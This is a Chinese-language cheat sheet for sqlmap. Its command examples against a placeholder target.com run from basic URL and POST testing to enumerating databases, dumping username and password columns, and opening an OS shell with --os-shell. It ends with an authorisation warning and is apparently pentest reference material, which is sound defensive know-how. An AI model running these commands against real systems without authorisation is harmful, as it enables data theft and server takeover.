# sqlmap - 自动化 SQL 注入工具

## 概述
| 属性 | 值 |
|------|-----|
| 二进制 | `sqlmap` |
| 类别 | Web 漏洞利用 |
| 风险等级 | 高 |

## 描述
sqlmap 是一个开源的自动化 SQL 注入检测和利用工具，支持多种数据库后端，可自动识别注入类型并提取数据。

---

## 使用场景

### 1. 基础 URL 测试
```bash
sqlmap -u "http://target.com/page?id=1"
```

### 2. POST 请求测试
```bash
sqlmap -u "http://target.com/login" --data "user=admin&pass=123"
```

### 3. 使用 Cookie
```bash
sqlmap -u "http://target.com/page?id=1" --cookie "session=abc123"
```

### 4. 枚举数据库
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
```

### 5. 枚举表
```bash
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
```

### 6. 枚举列
```bash
sqlmap -u "http://target.com/page?id=1" -D db -T users --columns
```

### 7. 导出数据
```bash
sqlmap -u "http://target.com/page?id=1" -D db -T users -C username,password --dump
```

### 8. 获取 Shell
```bash
sqlmap -u "http://target.com/page?id=1" --os-shell
```

### 9. 批量自动化
```bash
sqlmap -u "http://target.com/page?id=1" --batch
```

---

## 常用选项
| 选项 | 说明 |
|------|------|
| `-u` | 目标 URL |
| `--data` | POST 数据 |
| `--cookie` | Cookie |
| `-p` | 指定测试参数 |
| `--dbs` | 枚举数据库 |
| `-D` | 指定数据库 |
| `--tables` | 枚举表 |
| `-T` | 指定表 |
| `--columns` | 枚举列 |
| `-C` | 指定列 |
| `--dump` | 导出数据 |
| `--batch` | 自动确认 |
| `--level` | 测试级别 (1-5) |
| `--risk` | 风险级别 (1-3) |
| `--proxy` | 代理 |

---

## 安全提示
| 风险 | 说明 |
|------|------|
| **数据破坏** | `--os-shell` 可执行系统命令 |
| **检测** | 特征明显，易被 WAF 拦截 |
| **法律** | 未授权使用违法 |

> **警告**：仅在获得授权的目标上使用
